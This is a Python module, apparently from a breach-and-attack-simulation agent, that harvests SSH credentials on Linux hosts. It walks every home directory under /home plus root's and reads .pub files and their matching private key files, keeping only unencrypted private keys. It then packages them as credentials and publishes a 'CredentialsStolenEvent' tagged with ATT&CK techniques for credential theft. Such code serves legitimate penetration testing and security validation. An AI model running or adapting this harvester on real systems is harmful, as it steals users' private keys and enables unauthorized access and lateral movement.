import glob
import logging
import os
from typing import Dict, Iterable, Sequence

from common.agent_events import CredentialsStolenEvent
from common.credentials import Credentials, SSHKeypair, Username
from common.event_queue import IAgentEventQueue
from common.tags import (
    T1003_ATTACK_TECHNIQUE_TAG,
    T1005_ATTACK_TECHNIQUE_TAG,
    T1552_ATTACK_TECHNIQUE_TAG,
)
from common.types import AgentID
from common.utils.environment import is_windows_os

logger = logging.getLogger(__name__)

DEFAULT_DIRS = ["/.ssh/", "/"]
SSH_CREDENTIAL_COLLECTOR_TAG = "ssh-credentials-collector"

SSH_COLLECTOR_EVENT_TAGS = frozenset(
    (
        SSH_CREDENTIAL_COLLECTOR_TAG,
        T1003_ATTACK_TECHNIQUE_TAG,
        T1005_ATTACK_TECHNIQUE_TAG,
        T1552_ATTACK_TECHNIQUE_TAG,
    )
)


def get_ssh_info(agent_event_queue: IAgentEventQueue, agent_id: AgentID) -> Iterable[Dict]:
    # TODO: Remove this check when this is turned into a plugin.
    if is_windows_os():
        logger.debug(
            "Skipping SSH credentials collection because the operating system is not Linux"
        )
        return []

    home_dirs = _get_home_dirs()
    ssh_info = _get_ssh_files(home_dirs, agent_event_queue, agent_id)

    return ssh_info


def _get_home_dirs() -> Iterable[Dict]:
    import pwd

    root_dir = _get_ssh_struct("root", "")
    home_dirs = [
        _get_ssh_struct(x.pw_name, x.pw_dir) for x in pwd.getpwall() if x.pw_dir.startswith("/home")
    ]
    home_dirs.append(root_dir)
    return home_dirs


def _get_ssh_struct(name: str, home_dir: str) -> Dict:
    """
    Construct the SSH info. It consisted of: name, home_dir,
    public_key and private_key.

    public_key: contents of *.pub file (public key)
    private_key: contents of * file (private key)

    :param name: username of user, for whom the keys belong
    :param home_dir: users home directory
    :return: SSH info struct
    """
    # TODO: There may be multiple public keys for a single user
    # TODO: Authorized keys are missing.
    return {
        "name": name,
        "home_dir": home_dir,
        "public_key": None,
        "private_key": None,
    }


def _get_ssh_files(
    user_info: Iterable[Dict],
    agent_event_queue: IAgentEventQueue,
    agent_id: AgentID,
) -> Iterable[Dict]:
    for info in user_info:
        path = info["home_dir"]
        for directory in DEFAULT_DIRS:
            # TODO: Use PATH
            if os.path.isdir(path + directory):
                try:
                    current_path = path + directory
                    # Searching for public key
                    if glob.glob(os.path.join(current_path, "*.pub")):
                        # TODO: There may be multiple public keys for a single user
                        # Getting first file in current path with .pub extension(public key)
                        public = glob.glob(os.path.join(current_path, "*.pub"))[0]
                        logger.info("Found public key in %s" % public)
                        try:
                            with open(public) as f:
                                info["public_key"] = f.read()
                            # By default, private key has the same name as public,
                            # only without .pub
                            private = os.path.splitext(public)[0]
                            if os.path.exists(private):
                                try:
                                    with open(private) as f:
                                        # no use from ssh key if it's encrypted
                                        private_key = f.read()
                                        if private_key.find("ENCRYPTED") == -1:
                                            info["private_key"] = private_key
                                            logger.info("Found private key in %s" % private)
                                            collected_credentials = to_credentials([info])
                                            _publish_credentials_stolen_event(
                                                collected_credentials, agent_event_queue, agent_id
                                            )
                                        else:
                                            continue
                                except (IOError, OSError):
                                    pass
                            # If private key found don't search more
                            if info["private_key"]:
                                break
                        except (IOError, OSError):
                            pass
                except OSError:
                    pass
    user_info = [info for info in user_info if info["private_key"] or info["public_key"]]
    return user_info


def to_credentials(ssh_info: Iterable[Dict]) -> Sequence[Credentials]:
    ssh_credentials = []

    for info in ssh_info:
        identity = None
        secret = None

        if info.get("name", ""):
            identity = Username(username=info["name"])

        ssh_keypair = {}
        for key in ["public_key", "private_key"]:
            if info.get(key) is not None:
                ssh_keypair[key] = info[key]

            if len(ssh_keypair):
                secret = SSHKeypair(
                    private_key=ssh_keypair.get("private_key", ""),
                    public_key=ssh_keypair.get("public_key", ""),
                )

        if any([identity, secret]):
            ssh_credentials.append(Credentials(identity=identity, secret=secret))

    return ssh_credentials


def _publish_credentials_stolen_event(
    collected_credentials: Sequence[Credentials],
    agent_event_queue: IAgentEventQueue,
    agent_id: AgentID,
):
    credentials_stolen_event = CredentialsStolenEvent(
        source=agent_id,
        tags=SSH_COLLECTOR_EVENT_TAGS,
        stolen_credentials=collected_credentials,
    )

    agent_event_queue.publish(credentials_stolen_event)
